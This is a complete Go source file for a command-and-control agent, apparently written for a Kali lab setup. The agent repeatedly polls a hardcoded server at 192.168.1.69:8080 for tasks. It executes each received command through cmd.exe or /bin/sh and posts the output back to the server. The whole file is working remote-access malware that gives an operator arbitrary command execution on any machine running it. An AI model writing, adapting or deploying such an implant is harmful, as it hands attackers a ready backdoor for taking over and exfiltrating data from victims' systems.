package main

import (
	"crypto/rand"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func generateUUID() string {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		return "fallback-uuid"
	}
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

var c2URL = "http://192.168.1.69:8080" // Update this if needed to match your Kali IP

func main() {
	agentID := generateUUID()

	for {
		// 1. Fetch Task
		resp, err := http.Get(c2URL + "/tasks?id=" + agentID)
		if err != nil {
			fmt.Printf("![Conn Error]: %s\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close() // CRITICAL: Release the connection

		command := strings.TrimSpace(string(body))

		// 2. Only execute if NOT sleep
		if command == "exit" || command == "kill" {
			fmt.Println("[!] Shutting down")
			os.Exit(0)
		}

		if command != "sleep" && command != "" {
			fmt.Printf("[*] Tasking: %s\n", command)

			var cmd *exec.Cmd
			if runtime.GOOS == "windows" {
				cmd = exec.Command("cmd.exe", "/c", command)
			} else {
				cmd = exec.Command("/bin/sh", "-c", command)
			}

			// CombinedOutput handles Start() and Wait() in one go
			output, err := cmd.CombinedOutput()

			result := string(output)
			if err != nil {
				result += fmt.Sprintf("\n[!] Error: %s", err)
			}

			// 3. Post Results
			postResp, postErr := http.PostForm(c2URL+"/results?id="+agentID, url.Values{"output": {result}})
			if postErr == nil {
				postResp.Body.Close()
			}
		}

		time.Sleep(5 * time.Second)
	}
}